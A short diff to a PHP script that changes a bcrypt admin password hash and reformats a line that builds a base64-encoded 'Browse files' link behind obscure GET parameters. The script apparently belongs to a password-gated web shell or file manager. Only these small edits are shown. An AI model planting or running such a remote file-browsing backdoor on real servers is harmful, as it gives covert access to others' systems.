@@ -13,7 +13,7 @@ error_reporting(E_ALL);
 session_start();
 
 // Authentication setup
-$__key_hash = '$2a$12$b886WEkgH08F5R9hgadKeOLkUPagogYUAuhpK.uFaxZDGkBVlVDOu'; // password hash
+$__key_hash = '$2a$12$MCD5MCNCnRjs0upQcgeqBOe9DKLucnDFFWcQDU4isouu.qTI62J/a'; // password hash
 $__auth = 'admin_authenticated';
 
 // Logout
@@ -222,7 +222,7 @@ if (isset($_GET['x'])) {
         }
     }
 } else {
-    $cwd = getcwd();
+    $cwd =getcwd();
     echo "<a href='?big=dream&x=" . base64_encode("go|$cwd") . "'>📂 Browse files</a>";
 }
 
